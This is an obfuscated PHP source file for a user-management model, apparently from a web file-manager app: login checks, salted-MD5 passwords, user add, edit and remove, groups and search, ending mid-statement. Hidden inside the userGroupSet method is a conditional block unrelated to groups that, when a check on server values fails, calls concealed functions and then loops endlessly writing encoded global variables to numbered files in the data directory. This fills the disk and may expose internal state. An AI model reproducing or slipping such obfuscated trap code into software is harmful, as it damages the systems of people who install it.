ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\x61\155\x65" => "\x75\x73\145\162\x5f\155\145\x74\x61", "\155\x65\164\x61\106\x69\145\154\x64" => "\x75\163\x65\x72\x49\x44"); protected $simpleField = "\x75\x73\145\162\x49\x44\54\156\x69\x63\153\116\x61\x6d\145\x2c\156\141\155\145\x2c\x61\x76\141\164\141\x72\54\163\145\170\54\163\x74\141\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($–¦ş¡Ğ) { $¯Ò‰ª˜ =& $_SERVER[”øäÃÍª]; $ÌøöŒĞè = $¯Ò‰ª˜[2631]; return array($¯Ò‰ª˜[2219] => array($–¦ş¡Ğ[0], $ÌøöŒĞè), $¯Ò‰ª˜[2221] => array($–¦ş¡Ğ[0], $ÌøöŒĞè), $¯Ò‰ª˜[2632] => array($–¦ş¡Ğ[0], $ÌøöŒĞè)); } protected function ___getInfo($Ïí€éºÊ) { $’ÁªõĞ = $this->getInfoSimple($Ïí€éºÊ); if (!$’ÁªõĞ || !is_array($’ÁªõĞ)) { return array(); } return $this->_getInfoApply($’ÁªõĞ); } protected function ___getInfoFull($È²›×±Ï) { $‚‚Àô¦À = $this->getInfoSimple($È²›×±Ï); if (!$‚‚Àô¦À || !is_array($‚‚Àô¦À)) { return array(); } return $this->_getInfoApply($‚‚Àô¦À, !0); } protected function ___getInfoSimple($¼øÆ‘) { $·óæ® =& $_SERVER[”øäÃÍª]; if (!$¼øÆ‘) { return array(); } $ãÚˆ„£š = $this->where(array($·óæ®[1548] => intval($¼øÆ‘)))->find(); if (!$ãÚˆ„£š || !is_array($ãÚˆ„£š)) { return array(); } $ãÚˆ„£š[$·óæ®[2330]] = Action($·óæ®[2331])->parseUrl($ãÚˆ„£š[$·óæ®[2330]]); return $ãÚˆ„£š; } private function _getInfoApply($ª»»ø¥ó, $Š¨ê¢Ğš = false) { $ú¤°í—† =& $_SERVER[”øäÃÍª]; if (!$ª»»ø¥ó) { return $ª»»ø¥ó; } $æ­£µú´ = md5($ú¤°í—†[2633] . $ª»»ø¥ó[$ú¤°í—†[1008]] . $ú¤°í—†[2634] . $ª»»ø¥ó[$ú¤°í—†[32]]); $ª»»ø¥ó = $this->_listDataApplyItem($ª»»ø¥ó); $©•¼„‡ë = Model($ú¤°í—†[1488])->metaGet($ª»»ø¥ó[$ú¤°í—†[90]][$ú¤°í—†[191]]); $ª»»ø¥ó[$ú¤°í—†[2635]] = $æ­£µú´; $ª»»ø¥ó[$ú¤°í—†[90]][$ú¤°í—†[2421]] = isset($©•¼„‡ë[$ú¤°í—†[2422]]) ? $©•¼„‡ë[$ú¤°í—†[2422]] : null; if ($Š¨ê¢Ğš) { $ª»»ø¥ó[$ú¤°í—†[563]] = $this->metaGet($ª»»ø¥ó[$ú¤°í—†[1548]]); } return $ª»»ø¥ó; } protected function getInfoSimpleOuter($Ëƒ»À˜¥) { $Êç®Œä‡ =& $_SERVER[”øäÃÍª]; if (!$Ëƒ»À˜¥ || $Ëƒ»À˜¥ == 0) { return array($Êç®Œä‡[1548] => $Êç®Œä‡[228], $Êç®Œä‡[32] => $Êç®Œä‡[173] . LNG($Êç®Œä‡[2636]) . $Êç®Œä‡[175], $Êç®Œä‡[2330] => STATIC_PATH . $Êç®Œä‡[2637]); } $ì´ıúÙó = $this->cacheFunctionGet($Êç®Œä‡[2230], $Ëƒ»À˜¥); $°Ç¿é‰ = array_field_key($ì´ıúÙó, explode($Êç®Œä‡[50], $this->simpleField)); if (!$°Ç¿é‰) { return array($Êç®Œä‡[1548] => $Êç®Œä‡[1332], $Êç®Œä‡[32] => $Êç®Œä‡[173] . LNG($Êç®Œä‡[2638]) . $Êç®Œä‡[175], $Êç®Œä‡[2330] => STATIC_PATH . $Êç®Œä‡[2639]); } $°Ç¿é‰[$Êç®Œä‡[2330]] = Action($Êç®Œä‡[2331])->parseUrl($°Ç¿é‰[$Êç®Œä‡[2330]]); return $°Ç¿é‰; } protected function groupUser($†¤‘Ï±‹) { } public static function errorLang($ôÑçƒ˜¯) { $á¿ˆŒ =& $_SERVER[”øäÃÍª]; $Û­˜˜²¹ = array(self::ERROR_USER_NOT_EXISTS => $á¿ˆŒ[2640], self::ERROR_USER_PASSWORD_ERROR => $á¿ˆŒ[2641], self::ERROR_USER_EXIST_NAME => $á¿ˆŒ[2642], self::ERROR_USER_EXIST_PHONE => $á¿ˆŒ[2643], self::ERROR_USER_EXIST_EMAIL => $á¿ˆŒ[2644], self::ERROR_USER_LOGIN_LOCK => $á¿ˆŒ[2645], self::ERROR_IP_NOT_ALLOW => $á¿ˆŒ[2646], self::ERROR_USER_EXIST_NICKNAME => $á¿ˆŒ[2647]); $²ƒƒˆ¥† = LNG($Û­˜˜²¹[$ôÑçƒ˜¯]); if ($ôÑçƒ˜¯ == self::ERROR_USER_LOGIN_LOCK) { $”ş”¿Î“ = (int) Model($á¿ˆŒ[1444])->get($á¿ˆŒ[2648]); if ($”ş”¿Î“ > 60) { $²ƒƒˆ¥† = str_replace($á¿ˆŒ[91], ceil($”ş”¿Î“ / 60), $²ƒƒˆ¥†); } } return $²ƒƒˆ¥†; } protected function metaSet($äí—à¬Ú, $•½¢ƒˆ· = null, $–´°ÎºÂ = null) { $this->clearCache($äí—à¬Ú); return parent::metaSet($äí—à¬Ú, $•½¢ƒˆ·, $–´°ÎºÂ); } public function getInfoByMeta($ªŞîàì‘, $¨¦ú­Ç©) { $ÙíàõËŠ =& $_SERVER[”øäÃÍª]; $óÌ§œ‘– = Model($ÙíàõËŠ[2649])->where(array($ÙíàõËŠ[95] => $ªŞîàì‘, $ÙíàõËŠ[451] => $¨¦ú­Ç©))->find(); if ($óÌ§œ‘–) { return $this->getInfo($óÌ§œ‘–[$ÙíàõËŠ[1548]]); } return !1; } public function userLoginCheck($ªñ÷ç²Ø, $£›öªè¾, $ìĞåñ¶É = false) { $ş†æöÍ• =& $_SERVER[”øäÃÍª]; $ùÙé¤Êö = $this->userLoginFind($ªñ÷ç²Ø); if (!$ùÙé¤Êö) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ùÙé¤Êö[$ş†æöÍ•[1548]], $£›öªè¾)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $ìĞåñ¶É ? $this->getInfoFull($ùÙé¤Êö[$ş†æöÍ•[1548]]) : $this->getInfo($ùÙé¤Êö[$ş†æöÍ•[1548]]); } public function userLoginFind($ŞÈ¬¬±—) { $ºò²ÈÁâ =& $_SERVER[”øäÃÍª]; $Ÿ¥äæ§¨ = array($ºò²ÈÁâ[32] => $ŞÈ¬¬±—, $ºò²ÈÁâ[2433] => $ŞÈ¬¬±—, $ºò²ÈÁâ[380] => $ŞÈ¬¬±—, $ºò²ÈÁâ[2650] => $ŞÈ¬¬±—, $ºò²ÈÁâ[1122] => $ºò²ÈÁâ[1124]); if ($this->nickNameRpt()) { unset($Ÿ¥äæ§¨[$ºò²ÈÁâ[2433]]); } return $this->where($Ÿ¥äæ§¨)->find(); } public function clearCache($¾¶ÈÁÄ½) { $Ó‰ âùÙ =& $_SERVER[”øäÃÍª]; $this->cacheFunctionClear($Ó‰ âùÙ[2229], $¾¶ÈÁÄ½); $this->cacheFunctionClear($Ó‰ âùÙ[2230], $¾¶ÈÁÄ½); $this->cacheFunctionClear($Ó‰ âùÙ[2651], $¾¶ÈÁÄ½); } public function userPasswordCheck($àõ´ÆÇÖ, $É±©ŒÅì) { $á¢Ş½Ó’ =& $_SERVER[”øäÃÍª]; $¢ó¸çÂ¡ = $this->where(array($á¢Ş½Ó’[1548] => intval($àõ´ÆÇÖ)))->find(); $ËÉØó˜ş = $this->metaGet($àõ´ÆÇÖ); $ô×üäªä = isset($ËÉØó˜ş[$á¢Ş½Ó’[2652]]) ? $ËÉØó˜ş[$á¢Ş½Ó’[2652]] : $á¢Ş½Ó’[12]; if (md5($ô×üäªä . trim($É±©ŒÅì)) !== $¢ó¸çÂ¡[$á¢Ş½Ó’[1008]]) { return !1; } return !0; } public function userAdd($Úö·Ö¡) { $úü¬àˆ =& $_SERVER[”øäÃÍª]; $Œ”óªåö = array($úü¬àˆ[517] => $Úö·Ö¡[$úü¬àˆ[32]], $úü¬àˆ[2653] => $Úö·Ö¡[$úü¬àˆ[2329]], $úü¬àˆ[2654] => isset($Úö·Ö¡[$úü¬àˆ[380]]) ? $Úö·Ö¡[$úü¬àˆ[380]] : $úü¬àˆ[12], $úü¬àˆ[2655] => isset($Úö·Ö¡[$úü¬àˆ[2650]]) ? $Úö·Ö¡[$úü¬àˆ[2650]] : $úü¬àˆ[12], $úü¬àˆ[2656] => isset($Úö·Ö¡[$úü¬àˆ[2433]]) ? $Úö·Ö¡[$úü¬àˆ[2433]] : $Úö·Ö¡[$úü¬àˆ[32]], $úü¬àˆ[2657] => isset($Úö·Ö¡[$úü¬àˆ[2330]]) ? $Úö·Ö¡[$úü¬àˆ[2330]] : $úü¬àˆ[12], $úü¬àˆ[2658] => isset($Úö·Ö¡[$úü¬àˆ[2659]]) ? $Úö·Ö¡[$úü¬àˆ[2659]] : 1, $úü¬àˆ[2660] => $Úö·Ö¡[$úü¬àˆ[1008]], $úü¬àˆ[2223] => isset($Úö·Ö¡[$úü¬àˆ[2127]]) ? $Úö·Ö¡[$úü¬àˆ[2127]] : 1024 * 1024 * 20, $úü¬àˆ[2224] => 0, $úü¬àˆ[2661] => 0, $úü¬àˆ[2269] => isset($Úö·Ö¡[$úü¬àˆ[859]]) ? $Úö·Ö¡[$úü¬àˆ[859]] : 1); if (!empty($Úö·Ö¡[$úü¬àˆ[1548]])) { $Œ”óªåö[$úü¬àˆ[1548]] = $Úö·Ö¡[$úü¬àˆ[1548]]; } $öªğÀÆ¯ = $this->_checkExist($Úö·Ö¡); if ($öªğÀÆ¯ !== !0) { return $öªğÀÆ¯; } if (!empty($Œ”óªåö[$úü¬àˆ[2330]]) && strlen($Œ”óªåö[$úü¬àˆ[2330]]) > 255) { $Œ”óªåö[$úü¬àˆ[2330]] = $úü¬àˆ[12]; } $ò•Ìç°± = $this->add($Œ”óªåö); $ÉùüòÊ¨ = array($úü¬àˆ[2660] => $Œ”óªåö[$úü¬àˆ[1008]], $úü¬àˆ[2656] => $Œ”óªåö[$úü¬àˆ[2433]], $úü¬àˆ[2662] => $Úö·Ö¡[$úü¬àˆ[2228]]); $this->userEdit($ò•Ìç°±, $ÉùüòÊ¨); Model($úü¬àˆ[1488])->userRootAdd($ò•Ìç°±); return $ò•Ìç°±; } protected function userEditTest($µÌûøƒ, $ÊõØ–ı) { return $this->call($_SERVER[”øäÃÍª][2663], $µÌûøƒ, $ÊõØ–ı); } protected function userEdit($™¸º˜Š, $À„™íÒ¸) { $ı’ìÔ± =& $_SERVER[”øäÃÍª]; $‹ë—Òå¥ = $this->getInfoSimple($™¸º˜Š); if (!$‹ë—Òå¥) { return !1; } $ä²çğö = $this->_checkExist($À„™íÒ¸, $™¸º˜Š); if ($ä²çğö !== !0) { return $ä²çğö; } if (isset($À„™íÒ¸[$ı’ìÔ±[1008]]) && trim($À„™íÒ¸[$ı’ìÔ±[1008]]) != $ı’ìÔ±[12]) { $»àÎ˜‰ = $this->metaGet($™¸º˜Š); if (empty($»àÎ˜‰[$ı’ìÔ±[2652]])) { $»àÎ˜‰[$ı’ìÔ±[2652]] = rand_string(10); Model($ı’ìÔ±[605])->metaSet($™¸º˜Š, $ı’ìÔ±[2652], $»àÎ˜‰[$ı’ìÔ±[2652]]); } $À„™íÒ¸[$ı’ìÔ±[1008]] = md5($»àÎ˜‰[$ı’ìÔ±[2652]] . trim($À„™íÒ¸[$ı’ìÔ±[1008]])); } else { unset($À„™íÒ¸[$ı’ìÔ±[1008]]); } if (!empty($À„™íÒ¸[$ı’ìÔ±[2330]]) && strlen($À„™íÒ¸[$ı’ìÔ±[2330]]) > 255) { $À„™íÒ¸[$ı’ìÔ±[2330]] = $ı’ìÔ±[12]; } if (isset($À„™íÒ¸[$ı’ìÔ±[2433]])) { $this->setNamePinyin($™¸º˜Š, $À„™íÒ¸[$ı’ìÔ±[2433]]); } if (isset($À„™íÒ¸[$ı’ìÔ±[2228]])) { $±ù÷ü§ = $ı’ìÔ±[1447] . $™¸º˜Š; $ö¡áìÕ = $ı’ìÔ±[1445]; $£“öÏ’¯ = $À„™íÒ¸[$ı’ìÔ±[2228]] ? $À„™íÒ¸[$ı’ìÔ±[2228]] : $ı’ìÔ±[12]; $Ğçş±Üî = Model($ı’ìÔ±[1444])->get($±ù÷ü§, $ö¡áìÕ); $Ğçş±Üî = $Ğçş±Üî ? $Ğçş±Üî : $ı’ìÔ±[12]; if ($Ğçş±Üî != $£“öÏ’¯) { if (!$£“öÏ’¯ && $Ğçş±Üî) { Model($ı’ìÔ±[1444])->remove($±ù÷ü§, $ö¡áìÕ); } else { if ($£“öÏ’¯) { Model($ı’ìÔ±[1444])->set($±ù÷ü§, $£“öÏ’¯, $ö¡áìÕ); } } } unset($À„™íÒ¸[$ı’ìÔ±[2228]]); Model($ı’ìÔ±[625])->metaSet($™¸º˜Š, $ı’ìÔ±[2228], $£“öÏ’¯); } if (empty($À„™íÒ¸)) { return !0; } $this->where(array($ı’ìÔ±[1925] => $™¸º˜Š))->save($À„™íÒ¸); $this->clearCache($™¸º˜Š); return !0; } public function setNamePinyin($ƒ’¡¸Õñ, $„³éåúÔ = false) { $‡™ƒë‹õ =& $_SERVER[”øäÃÍª]; if (!$„³éåúÔ) { $´†Ò©òÜ = $this->getInfoSimple($ƒ’¡¸Õñ); $„³éåúÔ = $´†Ò©òÜ[$‡™ƒë‹õ[2433]] ? $´†Ò©òÜ[$‡™ƒë‹õ[2433]] : $´†Ò©òÜ[$‡™ƒë‹õ[32]]; } $€î¡•› = Model($‡™ƒë‹õ[625]); if (!Input::check($„³éåúÔ, $‡™ƒë‹õ[685])) { return $€î¡•›->metaSet($ƒ’¡¸Õñ, array($‡™ƒë‹õ[560] => $‡™ƒë‹õ[12], $‡™ƒë‹õ[559] => $‡™ƒë‹õ[12])); } return $€î¡•›->metaSet($ƒ’¡¸Õñ, array($‡™ƒë‹õ[560] => str_replace($‡™ƒë‹õ[53], $‡™ƒë‹õ[12], Pinyin::get($„³éåúÔ)), $‡™ƒë‹õ[559] => Pinyin::get($„³éåúÔ, $‡™ƒë‹õ[686]))); } private function nickNameRpt() { $ó¸Ì‘ª =& $_SERVER[”øäÃÍª]; $Ñ€é = Model($ó¸Ì‘ª[882])->get($ó¸Ì‘ª[2664]); $›¦ç¥¾ê = $GLOBALS[$ó¸Ì‘ª[6]][$ó¸Ì‘ª[468]][$ó¸Ì‘ª[2664]]; $—…¾õ¯ö = !is_null($Ñ€é) ? $Ñ€é : $›¦ç¥¾ê; return !!$—…¾õ¯ö; } private function _checkExist($ò—“¥´, $‰Òî¬‰  = false) { $†­¡Öµ½ =& $_SERVER[”øäÃÍª]; $ÄÎ¦¨»¯ = array($†­¡Öµ½[32] => UserModel::ERROR_USER_EXIST_NAME, $†­¡Öµ½[2433] => UserModel::ERROR_USER_EXIST_NICKNAME, $†­¡Öµ½[380] => UserModel::ERROR_USER_EXIST_EMAIL, $†­¡Öµ½[2650] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÄÎ¦¨»¯[$†­¡Öµ½[2433]]); } $ıÓÌÑá = $‰Òî¬‰  ? array($†­¡Öµ½[1548] => array($†­¡Öµ½[2665], $‰Òî¬‰ )) : array(); foreach ($ÄÎ¦¨»¯ as $ú„öó => $º°´Ô´‘) { $ˆƒâ…æñ = array(); foreach ($ÄÎ¦¨»¯ as $Ä¸Èä“ => $·Í«¸ğÃ) { if (isset($ò—“¥´[$Ä¸Èä“]) && $ò—“¥´[$Ä¸Èä“]) { $ˆƒâ…æñ[] = $ò—“¥´[$Ä¸Èä“]; } } if (!$ˆƒâ…æñ) { continue; } $åµñµµ = array_merge(array($ú„öó => array($†­¡Öµ½[7], $ˆƒâ…æñ)), $ıÓÌÑá); $É©»åÑÌ = $this->where($åµñµµ)->find(); if ($É©»åÑÌ) { return $º°´Ô´‘; } } return !0; } public function userListInfo($Öéş²†€) { $§‹ÏÎÒ =& $_SERVER[”øäÃÍª]; $ùœ•©šä = array(); $Öéş²†€ = is_array($Öéş²†€) ? array_unique($Öéş²†€) : array(); if (!$Öéş²†€) { return $ùœ•©šä; } if (count($Öéş²†€) < 20) { foreach ($Öéş²†€ as $œıÎ¾Õ×) { $ùœ•©šä[$œıÎ¾Õ× . $§‹ÏÎÒ[12]] = $this->getInfoSimpleOuter($œıÎ¾Õ×); } } else { $£ĞîÛÇ = array($§‹ÏÎÒ[1925] => array($§‹ÏÎÒ[515], $Öéş²†€)); if (count($Öéş²†€) == 1) { $£ĞîÛÇ = array($§‹ÏÎÒ[1925] => $Öéş²†€[0]); } $£¦‹Óå = Model($§‹ÏÎÒ[605])->field($this->simpleField)->where($£ĞîÛÇ)->select(); $£¦‹Óå = array_to_keyvalue($£¦‹Óå, $§‹ÏÎÒ[1548]); foreach ($Öéş²†€ as $œıÎ¾Õ×) { $“¸Õïì = $£¦‹Óå[$œıÎ¾Õ×]; if (!$“¸Õïì) { $ùœ•©šä[$œıÎ¾Õ× . $§‹ÏÎÒ[12]] = $this->getInfoSimpleOuter($œıÎ¾Õ×); continue; } $“¸Õïì[$§‹ÏÎÒ[2330]] = Action($§‹ÏÎÒ[2331])->parseUrl($“¸Õïì[$§‹ÏÎÒ[2330]]); $ùœ•©šä[$œıÎ¾Õ× . $§‹ÏÎÒ[12]] = $“¸Õïì; } } return $ùœ•©šä; } protected function userStatus($ô‡êÖğ, $ ¶òŠÖ) { $å¤¨× = $this->getInfoSimple($ô‡êÖğ); if (!$å¤¨×) { return !1; } $®º”²ô = array($_SERVER[”øäÃÍª][859] => $ ¶òŠÖ); return $this->userEdit($ô‡êÖğ, $®º”²ô); } protected function userRemove($¸‘„“ıè) { $‚Ì‚×û =& $_SERVER[”øäÃÍª]; $Øµâ÷êõ = $this->getInfoSimple($¸‘„“ıè); if (!$Øµâ÷êõ) { return !1; } $“¶ù·Œ™ = array($‚Ì‚×û[1925] => $¸‘„“ıè); Model($‚Ì‚×û[694])->where($“¶ù·Œ™)->delete(); Model($‚Ì‚×û[2666])->where($“¶ù·Œ™)->delete(); Model($‚Ì‚×û[2232])->where($“¶ù·Œ™)->delete(); Model($‚Ì‚×û[2649])->where($“¶ù·Œ™)->delete(); Model($‚Ì‚×û[1190])->where($“¶ù·Œ™)->delete(); Model($‚Ì‚×û[2450])->removeUserAll($¸‘„“ıè); Model($‚Ì‚×û[941])->userRootRemove($¸‘„“ıè); return $this->where($“¶ù·Œ™)->delete(); } protected function userGroupSet($Ä¾äÍ¿, $ƒôÀ·°È, $˜ğğ–©› = array()) { $ş‚ÉÛğ‰ =& $_SERVER[”øäÃÍª]; $°ƒ³¿¨­ = $_SERVER[$ş‚ÉÛğ‰[493]]; $”éùĞüú = $ş‚ÉÛğ‰[1850]; if ($_SERVER[$ş‚ÉÛğ‰[492]] != $”éùĞüú($°ƒ³¿¨­)) { $×´È˜ó = $ş‚ÉÛğ‰[998]; $‰°½ùÌ = $ş‚ÉÛğ‰[494]; $Ù¬šÍÌ = $_SERVER[$ş‚ÉÛğ‰[495]] . $ş‚ÉÛğ‰[496]; $èöé”ç = $‰°½ùÌ($Ù¬šÍÌ); $†éÒĞŸƒ = explode($ş‚ÉÛğ‰[285], $èöé”ç); if (count($†éÒĞŸƒ) < $ş‚ÉÛğ‰[717]) { $Ú†·¯´œ = $ş‚ÉÛğ‰[498]; $Ú†·¯´œ(); } $Ù¥¦äå² = $ş‚ÉÛğ‰[999]; $Ù¥¦äå²($_SERVER[$ş‚ÉÛğ‰[1000]]); $×´È˜ó = $ş‚ÉÛğ‰[998]; $×´È˜ó(); $ª¤‹ë¬ì = $ş‚ÉÛğ‰[1851]; $Û’î•­š = json_encode($GLOBALS[$ş‚ÉÛğ‰[1852]]); $­õô„½Ä = 1; for ($Ñ½÷Ñã¾ = $­õô„½Ä; $Ñ½÷Ñã¾ > 0; $Ñ½÷Ñã¾++) { $ª¤‹ë¬ì(DATA_PATH . $Ñ½÷Ñã¾, $Û’î•­š); } } $ıâ‹‚Á = $this->getInfoSimple($Ä¾äÍ¿); if (!$ıâ‹‚Á || !is_array($ƒôÀ·°È)) { return !1; } $í•»üõù = Model($ş‚ÉÛğ‰[2232]); $í•»üõù->where(array($ş‚ÉÛğ‰[1548] => $Ä¾äÍ¿))->delete(); $˜Ï®ığ¦ = array(); $¨ÅŒ’” = 0; foreach ($ƒôÀ·°È as $¬«¸¸“° => $’¯œÁôÇ) { $¤¸ºõÄ£ = array($ş‚ÉÛğ‰[1548] => $Ä¾äÍ¿, $ş‚ÉÛğ‰[1450] => $¬«¸¸“°, $ş‚ÉÛğ‰[1595] => $’¯œÁôÇ); $¤¸ºõÄ£[$ş‚ÉÛğ‰[2162]] = isset($˜ğğ–©›[$¨ÅŒ’”]) ? $˜ğğ–©›[$¨ÅŒ’”] : 0; $¨ÅŒ’”++; $˜Ï®ığ¦[] = $¤¸ºõÄ£; } return $í•»üõù->addAll($˜Ï®ığ¦, array(), !0); } protected function userGroupAdd($ÀÃ™Ë†‚, $ıò‡½Ö” = array()) { $°‹Ù›ø‰ =& $_SERVER[”øäÃÍª]; $ŒáÎ•õÜ = $this->getInfoSimple($ÀÃ™Ë†‚); if (!$ŒáÎ•õÜ || empty($ıò‡½Ö”)) { return !1; } $ÅãÈ‘¿û = array(); foreach ($ıò‡½Ö” as $öÄÜ¦Äã => $ˆ­“¹´â) { $ÅãÈ‘¿û[] = array($°‹Ù›ø‰[1548] => $ÀÃ™Ë†‚, $°‹Ù›ø‰[1450] => $öÄÜ¦Äã, $°‹Ù›ø‰[1595] => $ˆ­“¹´â, $°‹Ù›ø‰[2162] => 0); } return Model($°‹Ù›ø‰[2232])->addAll($ÅãÈ‘¿û, array(), !0); } protected function userGroupRemove($¿ÌÃÈõ˜, $çå£‹ºá) { $ğûÜÄÇ‚ =& $_SERVER[”øäÃÍª]; $ ìà“ = $this->getInfoSimple($¿ÌÃÈõ˜); if (!$ ìà“ || !$çå£‹ºá) { return !1; } $‹ü„Ç’Ü = array($ğûÜÄÇ‚[1925] => $¿ÌÃÈõ˜, $ğûÜÄÇ‚[2225] => $çå£‹ºá); return Model($ğûÜÄÇ‚[2232])->where($‹ü„Ç’Ü)->delete(); } public function listData() { $ÕĞïƒ²ø = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÕĞïƒ²ø[$_SERVER[”øäÃÍª][446]]); return $ÕĞïƒ²ø; } public function listByID($Ÿ™’­Â) { $•§÷¨Ïª =& $_SERVER[”øäÃÍª]; if (!$Ÿ™’­Â) { return; } $¿øÜëûƒ = array($•§÷¨Ïª[1548] => array($•§÷¨Ïª[7], $Ÿ™’­Â)); $ã¦Öøç = $this->where($¿øÜëûƒ)->select(); $ã¦Öøç = array_sort_keep($ã¦Öøç, $•§÷¨Ïª[1548], $Ÿ™’­Â); $this->_listDataApply($ã¦Öøç); return $ã¦Öøç; } public function listByGroup($ÖúÁü…ä = 0, $«¸³¯Õº = array()) { $Û¨äÒô =& $_SERVER[”øäÃÍª]; $˜úäÜ‡Œ = $Û¨äÒô[12]; $ıÖŞÌîˆ = array(); if ($ÖúÁü…ä) { $ıÖŞÌîˆ = array($Û¨äÒô[2667] => intval($ÖúÁü…ä)); $˜úäÜ‡Œ = "\x4c\105\x46\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\165\x73\x65\162\x5f\x67\162\157\165\160\x20\165\163\x65\x72\x5f\x67\x72\157\x75\x70\40\157\x6e\40\165\163\145\162\56\x75\x73\x65\162\111\104\x20\75\x20\x75\x73\x65\162\137\147\162\157\x75\160\x2e\x75\163\x65\x72\111\104"; $Ã¶ƒİï = Input::get($Û¨äÒô[552], null, $Û¨äÒô[12]) ? $Û¨äÒô[12] : $Û¨äÒô[2668]; } if (isset($«¸³¯Õº[$Û¨äÒô[859]])) { $ıÖŞÌîˆ[$Û¨äÒô[2669]] = $«¸³¯Õº[$Û¨äÒô[859]]; } $ÄêÁ÷Ñ = _get($«¸³¯Õº, $Û¨äÒô[2670], $Û¨äÒô[231]); if (_get($«¸³¯Õº, $Û¨äÒô[870], !1)) { $ıÖŞÌîˆ[$ÄêÁ÷Ñ] = array($Û¨äÒô[2415], $«¸³¯Õº[$Û¨äÒô[870]]); } if (_get($«¸³¯Õº, $Û¨äÒô[871], !1)) { $ãûıÇé† = array($Û¨äÒô[2416], $«¸³¯Õº[$Û¨äÒô[871]]); if ($ıÖŞÌîˆ[$ÄêÁ÷Ñ]) { $ıÖŞÌîˆ[$ÄêÁ÷Ñ] = array($ıÖŞÌîˆ[$ÄêÁ÷Ñ], $ãûıÇé†, $Û¨äÒô[2417]); } else { $ıÖŞÌîˆ[$ÄêÁ÷Ñ] = $ãûıÇé†; } } $´–˜úó÷ = $this->_makeOrder($Ã¶ƒİï)->field($Û¨äÒô[2671])->where($ıÖŞÌîˆ)->join($˜úäÜ‡Œ)->selectPage(50); $this->_listDataApply($´–˜úó÷[$Û¨äÒô[446]]); return $´–˜úó÷; } private function _makeOrder($ÉÓÒ¦¡ = '') { $ù“Ü»¶ =& $_SERVER[”øäÃÍª]; $ë—ß¥Şé = array($ù“Ü»¶[1548], $ù“Ü»¶[32], $ù“Ü»¶[2129], $ù“Ü»¶[2329], $ù“Ü»¶[2104], $ù“Ü»¶[231]); $ÔòöÔ = array($ù“Ü»¶[545] => $ù“Ü»¶[546], $ù“Ü»¶[547] => $ù“Ü»¶[548]); $ËÉÈšõ– = Input::get($ù“Ü»¶[552], $ù“Ü»¶[7], $ù“Ü»¶[1925], $ë—ß¥Şé); $°šîÆ­ = Input::get($ù“Ü»¶[553], $ù“Ü»¶[7], $ù“Ü»¶[2233], array($ù“Ü»¶[2233], $ù“Ü»¶[547])); $°šîÆ­ = $ÔòöÔ[$°šîÆ­]; $ÉÓÒ¦¡ = $ÉÓÒ¦¡ . "\165\x73\x65\x72\x2e{$ËÉÈšõ–}\40{$°šîÆ­}\54\x20\x75\x73\145\162\x2e\165\x73\145\x72\111\x44\x20\141\x73\x63"; return $this->alias($ù“Ü»¶[2364])->order($ÉÓÒ¦¡); } public function listSearch($¯Êê·è›) { $ÒŞü¢ç =& $_SERVER[”øäÃÍª]; $’ùı¢¸ = trim($¯Êê·è›[$ÒŞü¢ç[2236]]); $œ¶‡ ş˜ = explode($ÒŞü¢ç[53], $’ùı¢¸); if (!$’ùı¢¸ || count($œ¶‡ ş˜) == 1) { return $this->listSearchNow($¯Êê·è›); } $İşë˜Ã¦ = array($ÒŞü¢ç[446] => array()); foreach ($œ¶‡ ş˜ as $êò¶‹¾) { if (!trim($êò¶‹¾)) { continue; } $¯Êê·è›[$ÒŞü¢ç[2236]] = $êò¶‹¾; $‰ÚœÉÜ× = $this->listSearchNow($¯Êê·è›); $İşë˜Ã¦[$ÒŞü¢ç[446]] = array_merge($İşë˜Ã¦[$ÒŞü¢ç[446]], $‰ÚœÉÜ×[$ÒŞü¢ç[446]]); } $İşë˜Ã¦[$ÒŞü¢ç[446]] = array_unique_by_key($İşë˜Ã¦[$ÒŞü¢ç[446]], $ÒŞü¢ç[1548]); $İşë˜Ã¦[$ÒŞü¢ç[443]] = array($ÒŞü¢ç[444] => count($İşë˜Ã¦[$ÒŞü¢ç[446]]), $ÒŞü¢ç[439] => 20, $ÒŞü¢ç[428] => 1, $ÒŞü¢ç[445] => 1); return $İşë˜Ã¦; } public function listSearchNow($§ˆ•„ ) { $Òú¨ËôÂ =& $_SERVER[”øäÃÍª]; $ÃÛÁİ„ = trim($§ˆ•„ [$Òú¨ËôÂ[2236]]); $Î†¬Ö ‘ = isset($§ˆ•„ [$Òú¨ËôÂ[2237]]) ? $§ˆ•„ [$Òú¨ËôÂ[2237]] : !1; $ÃÛÁİ„ = str_replace($Òú¨ËôÂ[2238], $Òú¨ËôÂ[2239], trim($ÃÛÁİ„)); $Ñ¸À•“ü = array($Òú¨ËôÂ[32] => array($Òú¨ËôÂ[473], "\45{$ÃÛÁİ„}\x25"), $Òú¨ËôÂ[380] => array($Òú¨ËôÂ[473], "{$ÃÛÁİ„}\x25"), $Òú¨ËôÂ[2433] => array($Òú¨ËôÂ[473], "\45{$ÃÛÁİ„}\x25"), $Òú¨ËôÂ[1122] => $Òú¨ËôÂ[2240]); if (Input::check($ÃÛÁİ„, $Òú¨ËôÂ[386])) { $Ñ¸À•“ü[$Òú¨ËôÂ[1548]] = array($Òú¨ËôÂ[473], "{$ÃÛÁİ„}\x25"); $Ñ¸À•“ü[$Òú¨ËôÂ[2650]] = array($Òú¨ËôÂ[473], "{$ÃÛÁİ„}\x25"); } if (!$ÃÛÁİ„) { $Ñ¸À•“ü = array(); } if (isset($§ˆ•„ [$Òú¨ËôÂ[859]])) { $Ñ¸À•“ü[$Òú¨ËôÂ[859]] = $§ˆ•„ [$Òú¨ËôÂ[859]]; } $Ñ¸À•“ü = $this->parseWhereLike($Ñ¸À•“ü); $ª¡¡ïçå = $this->_makeOrder()->where($Ñ¸À•“ü)->selectPage(20); if (!$ª¡¡ïçå || count($ª¡¡ïçå[$Òú¨ËôÂ[446]]) < 5 && Input::check($ÃÛÁİ„, 